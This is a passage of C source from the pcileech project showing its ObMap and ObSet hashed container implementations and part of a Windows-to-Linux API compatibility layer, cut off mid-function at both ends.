    if(iEntry == OB_MAP_ENTRIES_DIRECTORY * OB_MAP_ENTRIES_TABLE * OB_MAP_ENTRIES_STORE) { return FALSE; }
    if(iEntry == pm->cHashGrowThreshold) {
        if(!_ObMap_Grow(pm)) {
            return FALSE;
        }
    }
    if(!pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)]) {    // allocate "table" if required
        if(!(pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)] = LocalAlloc(LMEM_ZEROINIT, sizeof(POB_MAP_ENTRY) * OB_MAP_ENTRIES_TABLE))) { return FALSE; }
    }
    if(!pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)][OB_MAP_INDEX_TABLE(iEntry)]) {    // allocate "store" if required
        if(!(pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)][OB_MAP_INDEX_TABLE(iEntry)] = LocalAlloc(LMEM_ZEROINIT, sizeof(OB_MAP_ENTRY) * OB_MAP_ENTRIES_STORE))) { return FALSE; }
    }
    if(pm->fObjectsOb) {
        Ob_INCREF(pvObject);
    }
    pm->c++;
    pe = _ObMap_GetFromIndex(pm, iEntry);
    pe->k = qwKey;
    pe->v = pvObject;
    _ObMap_InsertHash(pm, TRUE, iEntry);
    _ObMap_InsertHash(pm, FALSE, iEntry);
    return TRUE;
}

_Success_(return)
BOOL _ObMap_PushCopy(_In_ POB_MAP pm, _In_ QWORD qwKey, _In_ PVOID pvObject, _In_ SIZE_T cbObject)
{
    PVOID pvObjectCopy;
    if(!pm->fObjectsLocalFree) { return FALSE; }
    if(!(pvObjectCopy = LocalAlloc(0, cbObject))) { return FALSE; }
    memcpy(pvObjectCopy, pvObject, cbObject);
    if(_ObMap_Push(pm, qwKey, pvObjectCopy)) { return TRUE; }
    LocalFree(pvObjectCopy);
    return FALSE;
}

/*
* Push / Insert into the ObMap.
* -- pm
* -- qwKey
* -- pvObject
* -- return = TRUE on insertion, FALSE otherwise - i.e. if the key or object
*             already exists or if the max capacity of the map is reached.
*/
_Success_(return)
BOOL ObMap_Push(_In_opt_ POB_MAP pm, _In_ QWORD qwKey, _In_ PVOID pvObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, BOOL, FALSE, _ObMap_Push(pm, qwKey, pvObject))
}

/*
* Push / Insert into the ObMap by making a shallow copy of the object.
* NB! only valid for OB_MAP_FLAGS_OBJECT_LOCALFREE initialized maps.
* -- pm
* -- qwKey
* -- pvObject
* -- cbObject
* -- return = TRUE on insertion, FALSE otherwise - i.e. if the key or object
*             already exists or if the max capacity of the map is reached.
*/
_Success_(return)
BOOL ObMap_PushCopy(_In_opt_ POB_MAP pm, _In_ QWORD qwKey, _In_ PVOID pvObject, _In_ SIZE_T cbObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, BOOL, FALSE, _ObMap_PushCopy(pm, qwKey, pvObject, cbObject))
}

/*
* Create a new map. A map (ObMap) provides atomic map operations and ways
* to optionally map key values to values, pointers or object manager objects.
* The ObMap is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- flags = defined by OB_MAP_FLAGS_*
* -- return
*/
POB_MAP ObMap_New(_In_ QWORD flags)
{
    POB_MAP pObMap;
    if((flags & OB_MAP_FLAGS_OBJECT_OB) && (flags & OB_MAP_FLAGS_OBJECT_LOCALFREE)) { return NULL; }
    pObMap = Ob_Alloc(OB_TAG_CORE_MAP, LMEM_ZEROINIT, sizeof(OB_MAP), (OB_CLEANUP_CB)_ObMap_ObCloseCallback, NULL);
    if(!pObMap) { return NULL; }
    InitializeSRWLock(&pObMap->LockSRW);
    pObMap->c = 1;      // item zero is reserved - hence the initialization of count to 1
    pObMap->fKey = (flags & OB_MAP_FLAGS_NOKEY) ? FALSE : TRUE;
    pObMap->fObjectsOb = (flags & OB_MAP_FLAGS_OBJECT_OB) ? TRUE : FALSE;
    pObMap->fObjectsLocalFree = (flags & OB_MAP_FLAGS_OBJECT_LOCALFREE) ? TRUE : FALSE;
    pObMap->_SmallTable[0] = pObMap->Store00;
    pObMap->Directory[0] = pObMap->_SmallTable;
    pObMap->pHashMapValue = pObMap->_SmallHashMap;
    pObMap->cHashMax = 0x100;
    pObMap->cHashGrowThreshold = 0xc0;
    pObMap->pHashMapKey = pObMap->pHashMapValue + pObMap->cHashMax;
    return pObMap;
}

```

`pcileech/ob/ob_set.c`:

```c
// ob_set.c : implementation of object manager hashed value set functionality.
//
// The hashed value set (ObSet) provides thread safe efficient access to a set
// which is containing _NON_ZERO_ values (64-bit unsigned integers). The ObSet
// may hold a maximum capacity of 0x01000000 (~16M) entries - which are UNIQUE
// and _NON_ZERO_.
// The hashed value set (ObSet) guarantees order amongst values unless the
// function ObSet_Remove is called - in which order may change and on-going
// iterations of the set with ObSet_Get/ObSet_GetNext may fail.
// The ObSet is an object manager object and must be DECREF'ed when required.
//
// (c) Ulf Frisk, 2019-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "ob.h"
#include <stdio.h>

#define OB_SET_ENTRIES_DIRECTORY        0x100
#define OB_SET_ENTRIES_TABLE            0x80
#define OB_SET_ENTRIES_STORE            0x200

typedef struct tdOB_SET_TABLE_ENTRY {
    union {
        PQWORD pValues;                 // ptr to QWORD[OB_SET_ENTRIES_STORE]
        QWORD _Filler;
    };
} OB_SET_TABLE_ENTRY, *POB_SET_TABLE_ENTRY;

typedef struct tdOB_SET_TABLE_DIRECTORY_ENTRY {
    union {
        POB_SET_TABLE_ENTRY pTable;     // ptr to OB_SET_TABLE_ENTRY[OB_SET_ENTRIES_TABLE]
        QWORD _Filler;
    };
} OB_SET_TABLE_DIRECTORY_ENTRY, *POB_SET_TABLE_DIRECTORY_ENTRY;

typedef struct tdOB_SET {
    OB ObHdr;
    SRWLOCK LockSRW;
    DWORD c;
    DWORD cHashMax;
    DWORD cHashGrowThreshold;
    BOOL fLargeMode;
    PDWORD pHashMapLarge;
    union {
        WORD pHashMapSmall[0x400];
        OB_SET_TABLE_DIRECTORY_ENTRY pDirectory[OB_SET_ENTRIES_DIRECTORY];
    };
    OB_SET_TABLE_ENTRY pTable0[OB_SET_ENTRIES_TABLE];
    QWORD pStore00[OB_SET_ENTRIES_STORE];
} OB_SET, *POB_SET;

#define OB_SET_IS_VALID(p)          (p && (p->ObHdr._magic == OB_HEADER_MAGIC) && (p->ObHdr._tag == OB_TAG_CORE_SET))
#define TABLE_MAX_CAPACITY          OB_SET_ENTRIES_DIRECTORY * OB_SET_ENTRIES_TABLE * OB_SET_ENTRIES_STORE
#define HASH_FUNCTION(v)            (13 * (v + _rotr16((WORD)v, 9) + _rotr((DWORD)v, 17) + _rotr64(v, 31)))

#define OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pvs, RetTp, RetValFail, fn) {     \
    if(!OB_SET_IS_VALID(pvs)) { return RetValFail; }                                    \
    RetTp retVal;                                                                       \
    AcquireSRWLockExclusive(&pvs->LockSRW);                                             \
    retVal = fn;                                                                        \
    ReleaseSRWLockExclusive(&pvs->LockSRW);                                             \
    return retVal;                                                                      \
}

#define OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pvs, RetTp, RetValFail, fn) {      \
    if(!OB_SET_IS_VALID(pvs)) { return RetValFail; }                                    \
    RetTp retVal;                                                                       \
    AcquireSRWLockShared(&pvs->LockSRW);                                                \
    retVal = fn;                                                                        \
    ReleaseSRWLockShared(&pvs->LockSRW);                                                \
    return retVal;                                                                      \
}

/*
* Object Container object manager cleanup function to be called when reference
* count reaches zero.
* -- pObSet
*/
VOID _ObSet_ObCloseCallback(_In_ POB_SET pObSet)
{
    DWORD iDirectory, iTable;
    if(pObSet->fLargeMode) {
        for(iDirectory = 0; iDirectory < OB_SET_ENTRIES_DIRECTORY; iDirectory++) {
            if(!pObSet->pDirectory[iDirectory].pTable) { break; }
            for(iTable = 0; iTable < OB_SET_ENTRIES_TABLE; iTable++) {
                if(!pObSet->pDirectory[iDirectory].pTable[iTable].pValues) { break; }
                if(iDirectory || iTable) {
                    LocalFree(pObSet->pDirectory[iDirectory].pTable[iTable].pValues);
                }
            }
            if(iDirectory) {
                LocalFree(pObSet->pDirectory[iDirectory].pTable);
            }
        }
        LocalFree(pObSet->pHashMapLarge);
    } else {
        for(iTable = 1; iTable < OB_SET_ENTRIES_TABLE; iTable++) {
            if(!pObSet->pTable0[iTable].pValues) { break; }
            LocalFree(pObSet->pTable0[iTable].pValues);
        }
    }
}

/*
* Create a new hashed value set. A hashed value set (ObSet) provides atomic
* ways to store unique 64-bit (or smaller) numbers as a set.
* The ObSet is an object manager object and must be DECREF'ed when required.
* CALLER DECREF: return
* -- return
*/
POB_SET ObSet_New()
{
    POB_SET pObSet = Ob_Alloc(OB_TAG_CORE_SET, LMEM_ZEROINIT, sizeof(OB_SET), (OB_CLEANUP_CB)_ObSet_ObCloseCallback, NULL);
    if(!pObSet) { return NULL; }
    InitializeSRWLock(&pObSet->LockSRW);
    pObSet->c = 1;     // item zero is reserved - hence the initialization of count to 1
    pObSet->cHashMax = 0x400;
    pObSet->cHashGrowThreshold = 0x300;
    pObSet->pTable0[0].pValues = pObSet->pStore00;
    return pObSet;
}

QWORD _ObSet_GetValueFromIndex(_In_ POB_SET pvs, _In_ DWORD iValue)
{
    WORD iDirectory = (iValue >> 14) & (OB_SET_ENTRIES_DIRECTORY - 1);
    WORD iTable = (iValue >> 9) & (OB_SET_ENTRIES_TABLE - 1);
    WORD iValueStore = iValue & (OB_SET_ENTRIES_STORE - 1);
    if(!iValue || (iValue >= pvs->c)) { return 0; }
    return pvs->fLargeMode ?
        pvs->pDirectory[iDirectory].pTable[iTable].pValues[iValueStore] :
        pvs->pTable0[iTable].pValues[iValueStore];
}

VOID _ObSet_SetValueFromIndex(_In_ POB_SET pvs, _In_ DWORD iValue, _In_ QWORD qwValue)
{
    WORD iDirectory = (iValue >> 14) & (OB_SET_ENTRIES_DIRECTORY - 1);
    WORD iTable = (iValue >> 9) & (OB_SET_ENTRIES_TABLE - 1);
    WORD iValueStore = iValue & (OB_SET_ENTRIES_STORE - 1);
    if(pvs->fLargeMode) {
        pvs->pDirectory[iDirectory].pTable[iTable].pValues[iValueStore] = qwValue;
    } else {
        pvs->pTable0[iTable].pValues[iValueStore] = qwValue;
    }
}

DWORD _ObSet_GetIndexFromHash(_In_ POB_SET pvs, _In_ DWORD iHash)
{
    return pvs->fLargeMode ? pvs->pHashMapLarge[iHash] : pvs->pHashMapSmall[iHash];
}

VOID _ObSet_SetHashIndex(_In_ POB_SET pvs, _In_ DWORD iHash, _In_ DWORD iValue)
{
    if(pvs->fLargeMode) {
        pvs->pHashMapLarge[iHash] = iValue;
    } else {
        pvs->pHashMapSmall[iHash] = (WORD)iValue;
    }
}

VOID _ObSet_InsertHash(_In_ POB_SET pvs, _In_ DWORD iValue)
{
    DWORD iHash;
    DWORD dwHashMask = pvs->cHashMax - 1;
    QWORD qwValueToHash = _ObSet_GetValueFromIndex(pvs, iValue);
    if(!qwValueToHash) { return; }
    iHash = HASH_FUNCTION(qwValueToHash) & dwHashMask;
    while(_ObSet_GetIndexFromHash(pvs, iHash)) {
        iHash = (iHash + 1) & dwHashMask;
    }
    _ObSet_SetHashIndex(pvs, iHash, iValue);
}

VOID _ObSet_RemoveHash(_In_ POB_SET pvs, _In_ DWORD iHash)
{
    DWORD dwHashMask = pvs->cHashMax - 1;
    DWORD iNextHash, iNextEntry, iNextHashPreferred;
    // clear existing hash entry
    _ObSet_SetHashIndex(pvs, iHash, 0);
    // re-hash any entries following
    iNextHash = iHash;
    while(TRUE) {
        iNextHash = (iNextHash + 1) & dwHashMask;
        iNextEntry = _ObSet_GetIndexFromHash(pvs, iNextHash);
        if(0 == iNextEntry) { return; }
        iNextHashPreferred = HASH_FUNCTION(_ObSet_GetValueFromIndex(pvs, iNextEntry)) & dwHashMask;
        if(iNextHash == iNextHashPreferred) { continue; }
        if(pvs->fLargeMode) {
            pvs->pHashMapLarge[iNextHash] = 0;
        } else {
            pvs->pHashMapSmall[iNextHash] = 0;
        }
        _ObSet_InsertHash(pvs, iNextEntry);
    }
}

_Success_(return)
BOOL _ObSet_GetIndexFromValue(_In_ POB_SET pvs, _In_ QWORD v, _Out_opt_ PDWORD pdwIndexValue, _Out_opt_ PDWORD pdwIndexHash)
{
    DWORD dwIndex;
    DWORD dwHashMask = pvs->cHashMax - 1;
    DWORD dwHash = HASH_FUNCTION(v) & dwHashMask;
    // scan hash table to find entry
    while(TRUE) {
        dwIndex = _ObSet_GetIndexFromHash(pvs, dwHash);
        if(0 == dwIndex) { return FALSE; }
        if(v == _ObSet_GetValueFromIndex(pvs, dwIndex)) { 
            if(pdwIndexValue) { *pdwIndexValue = dwIndex; }
            if(pdwIndexHash) { *pdwIndexHash = dwHash; }
            return TRUE;
        }
        dwHash = (dwHash + 1) & dwHashMask;
    }
}

BOOL _ObSet_Exists(_In_ POB_SET pvs, _In_ QWORD value)
{
    return _ObSet_GetIndexFromValue(pvs, value, NULL, NULL);
}

/*
* Check if a value already exists in the ObSet.
* -- pvs
* -- value
* -- return
*/
BOOL ObSet_Exists(_In_opt_ POB_SET pvs, _In_ QWORD value)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pvs, BOOL, FALSE, _ObSet_Exists(pvs, value))
}

/*
* Retrieve a value given a value index (which is less than the amount of items
* in the Set).
* NB! Correctness of the Get/GetNext functionality is _NOT- guaranteed if the
* ObSet_Remove function is called while iterating over the ObSet - items may
* be skipped or iterated over multiple times!
* -- pvs
* -- index
* -- return
*/
QWORD ObSet_Get(_In_opt_ POB_SET pvs, _In_ DWORD index)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pvs, QWORD, 0, _ObSet_GetValueFromIndex(pvs, index + 1))  // (+1 == account/adjust for index 0 (reserved))
}

QWORD _ObSet_GetNext(_In_ POB_SET pvs, _In_ QWORD value)
{
    DWORD iValue;
    if(value == 0) {
        return _ObSet_GetValueFromIndex(pvs, 1);   // (+1 == account/adjust for index 0 (reserved))
    }
    if(!_ObSet_GetIndexFromValue(pvs, value, &iValue, NULL)) { return 0; }
    return _ObSet_GetValueFromIndex(pvs, iValue + 1);
}

/*
* Retrieve the next value given a value. The start value and end value are the
* ZERO value (which is a special reserved non-valid value).
* NB! Correctness of the Get/GetNext functionality is _NOT_ guaranteed if the
* ObSet_Remove function is called while iterating over the ObSet - items may
* be skipped or iterated over multiple times!
* -- pvs
* -- value
* -- return
*/
QWORD ObSet_GetNext(_In_opt_ POB_SET pvs, _In_ QWORD value)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pvs, QWORD, 0, _ObSet_GetNext(pvs, value))
}

POB_DATA _ObSet_GetAll(_In_ POB_SET pvs)
{
    DWORD iValue;
    POB_DATA pObData;
    if(!(pObData = Ob_Alloc(OB_TAG_CORE_DATA, 0, sizeof(OB) + (pvs->c - 1) * sizeof(QWORD), NULL, NULL))) { return NULL; }
    for(iValue = pvs->c - 1; iValue; iValue--) {
        pObData->pqw[iValue - 1] = _ObSet_GetValueFromIndex(pvs, iValue);
    }
    return pObData;
}

/*
* Retrieve all values in the Set as a POB_DATA object containing the values
* in a QWORD table.
* -- CALLER DECREF: return
* -- pvs
* -- return
*/
POB_DATA ObSet_GetAll(_In_opt_ POB_SET pvs)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pvs, POB_DATA, NULL, _ObSet_GetAll(pvs))
}

BOOL _ObSet_Remove(_In_ POB_SET pvs, _In_ QWORD value)
{
    QWORD qwLastValue;
    DWORD iRemoveValue, iRemoveHash;
    DWORD iLastValue, iLastHash;
    DWORD dwHashMask = pvs->cHashMax - 1;
    if(value == 0) { return FALSE; }
    if(!_ObSet_GetIndexFromValue(pvs, value, &iRemoveValue, &iRemoveHash)) { return FALSE; }
    qwLastValue = _ObSet_GetValueFromIndex(pvs, pvs->c - 1);
    if(qwLastValue == 0) { return FALSE; }
    if(!_ObSet_GetIndexFromValue(pvs, qwLastValue, &iLastValue, &iLastHash)) { return FALSE; }
    _ObSet_SetValueFromIndex(pvs, iLastValue, 0);
    _ObSet_RemoveHash(pvs, iLastHash);
    pvs->c--;
    if(iLastValue != iRemoveValue) {    // overwrite value to remove with last value if required.
        _ObSet_RemoveHash(pvs, iRemoveHash);
        _ObSet_SetValueFromIndex(pvs, iRemoveValue, qwLastValue);
        _ObSet_InsertHash(pvs, iRemoveValue);
    }
    return TRUE;
}

/*
* Remove an existing value from the ObSet.
* NB! must not be called simultaneously while iterating with ObSet_Get/ObSet_GetNext.
* -- pvs
* -- value
* -- return = removal was successful (i.e. the value was found and removed).
*/
BOOL ObSet_Remove(_In_opt_ POB_SET pvs, _In_ QWORD value)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pvs, BOOL, FALSE, _ObSet_Remove(pvs, value))
}

/*
* Clear the ObSet by removing all values.
* NB! underlying allocated memory will remain unchanged.
* -- pvs
*/
VOID ObSet_Clear(_In_opt_ POB_SET pvs)
{
    if(!OB_SET_IS_VALID(pvs) || (pvs->c <= 1)) { return; }
    AcquireSRWLockExclusive(&pvs->LockSRW);
    if(pvs->c <= 1) {
        ReleaseSRWLockExclusive(&pvs->LockSRW);
        return;
    }
    if(pvs->fLargeMode) {
        ZeroMemory(pvs->pHashMapLarge, pvs->cHashMax * sizeof(DWORD));
    } else {
        ZeroMemory(pvs->pHashMapSmall, sizeof(pvs->pHashMapSmall));
    }
    pvs->c = 1;     // item zero is reserved - hence the initialization of count to 1
    ReleaseSRWLockExclusive(&pvs->LockSRW);
}

QWORD _ObSet_Pop(_In_ POB_SET pvs)
{
    QWORD qwLastValue;
    DWORD iLastValue, iLastHash;
    qwLastValue = _ObSet_GetValueFromIndex(pvs, pvs->c - 1);
    if(qwLastValue == 0) { return 0; }
    if(!_ObSet_GetIndexFromValue(pvs, qwLastValue, &iLastValue, &iLastHash)) { return 0; }
    _ObSet_SetValueFromIndex(pvs, iLastValue, 0);
    _ObSet_RemoveHash(pvs, iLastHash);
    pvs->c--;
    return qwLastValue;
}

/*
* Remove the "last" value in a way that is safe for concurrent iterations of
* values in the set.
* -- pvs
* -- return = success: value, fail: 0.
*
*/
QWORD ObSet_Pop(_In_opt_ POB_SET pvs)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pvs, QWORD, 0, _ObSet_Pop(pvs))
}

/*
* Grow the Table for hash lookups by a factor of *2.
* -- pvs
* -- return
*/
_Success_(return)
BOOL _ObSet_Grow(_In_ POB_SET pvs)
{
    DWORD iValue;
    PDWORD pdwNewAllocHashMap;
    if(!(pdwNewAllocHashMap = LocalAlloc(LMEM_ZEROINIT, 2 * sizeof(DWORD) * pvs->cHashMax))) { return FALSE; }
    if(!pvs->fLargeMode) {
        ZeroMemory(pvs->pDirectory, OB_SET_ENTRIES_DIRECTORY * sizeof(OB_SET_TABLE_DIRECTORY_ENTRY));
        pvs->pDirectory[0].pTable = pvs->pTable0;
        pvs->fLargeMode = TRUE;
    }
    pvs->cHashMax *= 2;
    pvs->cHashGrowThreshold *= 2;
    LocalFree(pvs->pHashMapLarge);
    pvs->pHashMapLarge = pdwNewAllocHashMap;
    for(iValue = 1; iValue < pvs->c; iValue++) {
        _ObSet_InsertHash(pvs, iValue);
    }
    return TRUE;
}

_Success_(return)
BOOL _ObSet_Push(_In_ POB_SET pvs, _In_ QWORD value)
{
    POB_SET_TABLE_ENTRY pTable = NULL;
    DWORD iValue = pvs->c;
    WORD iDirectory = (iValue >> 14) & (OB_SET_ENTRIES_DIRECTORY - 1);
    WORD iTable = (iValue >> 9) & (OB_SET_ENTRIES_TABLE - 1);
    WORD iValueStore = iValue & (OB_SET_ENTRIES_STORE - 1);
    if((value == 0) || _ObSet_Exists(pvs, value)) { return FALSE; }
    if(iValue == OB_SET_ENTRIES_DIRECTORY * OB_SET_ENTRIES_TABLE * OB_SET_ENTRIES_STORE) { return FALSE; }
    if(iValue == pvs->cHashGrowThreshold) {
        if(!_ObSet_Grow(pvs)) {
            return FALSE;
        }
    }
    if(iDirectory && !pvs->pDirectory[iDirectory].pTable) { // Ensure Table Exists
        pvs->pDirectory[iDirectory].pTable = LocalAlloc(LMEM_ZEROINIT, OB_SET_ENTRIES_TABLE * sizeof(OB_SET_TABLE_ENTRY));
        if(!pvs->pDirectory[iDirectory].pTable) { return FALSE; }
    }
    pTable = iDirectory ? pvs->pDirectory[iDirectory].pTable : pvs->pTable0;
    if(!pTable[iTable].pValues) {   // Ensure Store Exists
        pTable[iTable].pValues = LocalAlloc(0, OB_SET_ENTRIES_STORE * sizeof(OB_SET_TABLE_ENTRY));
        if(!pTable[iTable].pValues) { return FALSE; }
    }
    pvs->c++;
    _ObSet_SetValueFromIndex(pvs, iValue, value);
    _ObSet_InsertHash(pvs, iValue);
    return TRUE;
}

_Success_(return)
BOOL _ObSet_PushSet(_In_ POB_SET pvs, _In_opt_ POB_SET pvsSrc)
{
    DWORD iValue;
    if(pvsSrc) {
        AcquireSRWLockShared(&pvsSrc->LockSRW);
        for(iValue = pvsSrc->c - 1; iValue; iValue--) {
            QWORD qwValue = _ObSet_GetValueFromIndex(pvsSrc, iValue);
            _ObSet_Push(pvs, _ObSet_GetValueFromIndex(pvsSrc, iValue));
        }
        ReleaseSRWLockShared(&pvsSrc->LockSRW);
    }
    return TRUE;
}

_Success_(return)
BOOL _ObSet_PushData(_In_ POB_SET pvs, _In_opt_ POB_DATA pDataSrc)
{
    DWORD i, iMax;
    if(pDataSrc) {   
        for(i = 0, iMax = pDataSrc->ObHdr.cbData / sizeof(QWORD); i < iMax; i++) {
            _ObSet_Push(pvs, pDataSrc->pqw[i]);
        }
    }
    return TRUE;
}

/*
* Push / Insert a non-zero value into the ObSet.
* -- pvs
* -- value
* -- return = TRUE on insertion, FALSE otherwise - i.e. if value already
*             exists or if the max capacity of the set is reached.
*/
_Success_(return)
BOOL ObSet_Push(_In_opt_ POB_SET pvs, _In_ QWORD value)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pvs, BOOL, FALSE, _ObSet_Push(pvs, value))
}

/*
* Push/Merge/Insert all values from the ObSet pvsSrc into the ObSet pvs.
* The source set is kept intact.
* -- pvs
* -- pvsSrc
* -- return = TRUE on success, FALSE otherwise.
*/
_Success_(return)
BOOL ObSet_PushSet(_In_opt_ POB_SET pvs, _In_opt_ POB_SET pvsSrc)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pvs, BOOL, FALSE, _ObSet_PushSet(pvs, pvsSrc))
}

/*
* Push/Merge/Insert all QWORD values from the ObData pDataSrc into the ObSet pvs.
* The source data is kept intact.
* -- pvs
* -- pDataSrc
* -- return = TRUE on success, FALSE otherwise.
*/
_Success_(return)
BOOL ObSet_PushData(_In_opt_ POB_SET pvs, _In_opt_ POB_DATA pDataSrc)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pvs, BOOL, FALSE, _ObSet_PushData(pvs, pDataSrc))
}

/*
* Insert a value representing an address into the ObSet. If the length of the
* data read from the start of the address a traverses page boundries all the
* pages are inserted into the set.
* -- pvs
* -- a
* -- cb
*/
VOID ObSet_Push_PageAlign(_In_opt_ POB_SET pvs, _In_ QWORD a, _In_ DWORD cb)
{
    QWORD qwA;
    if(!OB_SET_IS_VALID(pvs)) { return; }
    qwA = a & ~0xfff;
    if(qwA == 0xfffffffffffff000) { return; }
    while(qwA < a + cb) {
        ObSet_Push(pvs, qwA);
        qwA += 0x1000;
    }
}

/*
* Retrieve the number of items in the given ObSet.
* -- pvs
* -- return
*/
DWORD ObSet_Size(_In_opt_ POB_SET pvs)
{
    OB_SET_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pvs, DWORD, 0, pvs->c - 1)
}

```

`pcileech/oscompatibility.c`:

```c
// oscompatibility.c : pcileech windows/linux compatibility layer.
//
// (c) Ulf Frisk, 2017-2022
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifdef _WIN32

#include "oscompatibility.h"

VOID usleep(_In_ DWORD us)
{
    QWORD tmFreq, tmStart, tmNow, tmThreshold;
    if(us == 0) { return; }
    QueryPerformanceFrequency((PLARGE_INTEGER)&tmFreq);
    tmThreshold = tmFreq * us / (1000 * 1000);  // dw_uS uS
    QueryPerformanceCounter((PLARGE_INTEGER)&tmStart);
    while(QueryPerformanceCounter((PLARGE_INTEGER)&tmNow) && ((tmNow - tmStart) < tmThreshold)) {
        ;
    }
}

#endif /* _WIN32 */
#ifdef LINUX

#include "oscompatibility.h"
#include <stdatomic.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <termios.h>
#include "util.h"

#define INTERNAL_HANDLE_TYPE_THREAD        0xdeadbeeffedfed01

typedef struct tdINTERNAL_HANDLE {
    QWORD type;
    HANDLE handle;
} INTERNAL_HANDLE, *PINTERNAL_HANDLE;

HANDLE LocalAlloc(DWORD uFlags, SIZE_T uBytes)
{
    HANDLE h = malloc(uBytes);
    if(h && (uFlags & LMEM_ZEROINIT)) {
        memset(h, 0, uBytes);
    }
    return h;
}

VOID LocalFree(HANDLE hMem)
{
    free(hMem);
}

QWORD GetTickCount64()
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_COARSE, &ts);
    return ts.tv_sec * 1000 + ts.tv_nsec / (1000 * 1000);
}

BOOL QueryPerformanceFrequency(_Out_ LARGE_INTEGER *lpFrequency)
{
    *lpFrequency = 1000 * 1000;
    return TRUE;
}

BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER *lpPerformanceCount)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_COARSE, &ts);
    *lpPerformanceCount = (ts.tv_sec * 1000 * 1000) + (ts.tv_nsec / 1000);  // uS resolution
    return TRUE;
}

HANDLE CreateThread(
    PVOID     lpThreadAttributes,
    SIZE_T    dwStackSize,
    PVOID     lpStartAddress,
    PVOID     lpParameter,
    DWORD     dwCreationFlags,
    PDWORD    lpThreadId
) {
    PINTERNAL_HANDLE ph;
    pthread_t thread;
    int status;
    UNREFERENCED_PARAMETER(lpThreadAttributes);
    UNREFERENCED_PARAMETER(dwStackSize);
    UNREFERENCED_PARAMETER(dwCreationFlags);
    UNREFERENCED_PARAMETER(lpThreadId);
    status = pthread_create(&thread, NULL, lpStartAddress, lpParameter);
    if(status) { return NULL;}
    ph = malloc(sizeof(INTERNAL_HANDLE));
    ph->type = INTERNAL_HANDLE_TYPE_THREAD;
    ph->handle = (HANDLE)thread;
    return ph;
}

VOID GetLocalTime(LPSYSTEMTIME lpSystemTime)
{
    time_t curtime;
    struct tm *t;
    curtime = time(NULL);
    t = localtime(&curtime);
    lpSystemTime->wYear = t->tm_year;
    lpSystemTime->wMonth = t->tm_mon;
    lpSystemTime->wDayOfWeek = t->tm_wday;
    lpSystemTime->wDay = t->tm_yday;
    lpSystemTime->wHour = t->tm_hour;
    lpSystemTime->wMinute = t->tm_min;
    lpSystemTime->wSecond = t->tm_sec;
    lpSystemTime->wMilliseconds = 0;
}

HANDLE FindFirstFileA(LPSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
{
    DWORD i;
    DIR *hDir;
    CHAR szDirName[MAX_PATH];
    memset(szDirName, 0, MAX_PATH);
    strcpy_s(lpFindFileData->__cExtension, 5, lpFileName + strlen(lpFileName) - 3);
    strcpy_s(szDirName, MAX_PATH, lpFileName);
    for(i = strlen(szDirName) - 1; i > 0; i--) {
        if(szDirName[i] == '/') {
            szDirName[i] = 0;
            break;
        }
    }
    hDir = opendir(szDirName);
    if(!hDir) { return NULL; }
    return FindNextFileA((HANDLE)hDir, lpFindFileData) ? (HANDLE)hDir : INVALID_HANDLE_VALUE;
}

BOOL FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
    DIR *hDir = (DIR*)hFindFile;
    struct dirent *dir;
    char* sz;
    if(!hDir) { return FALSE; }
    while ((dir = readdir(hDir)) != NULL) {
        sz = dir->d_name;
        if((strlen(sz) > 3) && !strcasecmp(sz + strlen(sz) - 3, lpFindFileData->__cExtension)) {
            strcpy_s(lpFindFileData->cFileName, MAX_PATH, sz);
            return TRUE;
        }
    }
    closedir(hDir);
    return FALSE;
}

DWORD InterlockedAdd(DWORD *Addend, DWORD Value)
{
    return __sync_add_and_fetch(Addend, Value);
}

// ----------------------------------------------------------------------------
// LoadLibrary / GetProcAddress facades (for FPGA functionality) below:
// ----------------------------------------------------------------------------

HMODULE LoadLibraryA(LPSTR lpFileName)
{
    return dlopen(lpFileName, RTLD_NOW);
}

BOOL FreeLibrary(_In_ HMODULE hLibModule)
{
    dlclose(hLibModule);
    return TRUE;
}

FARPROC GetProcAddress(HMODULE hModule, LPSTR lpProcName)
{
    return dlsym(hModule, lpProcName);
}

BOOL GetExitCodeThread(HANDLE hThread, PDWORD lpExitCode)
{
    PINTERNAL_HANDLE ph = (PINTERNAL_HANDLE)hThread;
    if(ph->type != INTERNAL_HANDLE_TYPE_THREAD) { return FALSE; }
    *lpExitCode = (pthread_tryjoin_np((pthread_t)ph->handle, NULL) == EBUSY) ? STILL_ACTIVE : 0;
    return TRUE;
}

// ----------------------------------------------------------------------------
// CRITICAL_SECTION functionality below:
// ----------------------------------------------------------------------------

VOID InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
    memset(lpCriticalSection, 0, sizeof(CRITICAL_SECTION));
    pthread_mutexattr_init(&lpCriticalSection->mta);
